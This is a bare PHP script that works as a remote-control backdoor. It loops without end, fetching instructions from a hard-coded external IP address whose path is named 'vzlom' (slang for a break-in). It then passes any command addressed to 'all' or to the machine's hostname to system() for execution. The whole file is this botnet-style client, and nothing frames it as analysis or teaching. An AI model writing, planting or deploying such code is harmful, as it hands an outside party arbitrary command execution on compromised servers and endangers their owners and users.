<?php
while (1) {
$x=file_get_contents("http://3.120.174.176/vzlom/");
$x=explode(".",$x);
$hn=gethostname();
if ($x[0]=='' || $x[1]=='') {

}

else if ($x[1]=='all' || $x[1]==$hn) {
system($x[0]);
}
unset($x);
}
?>
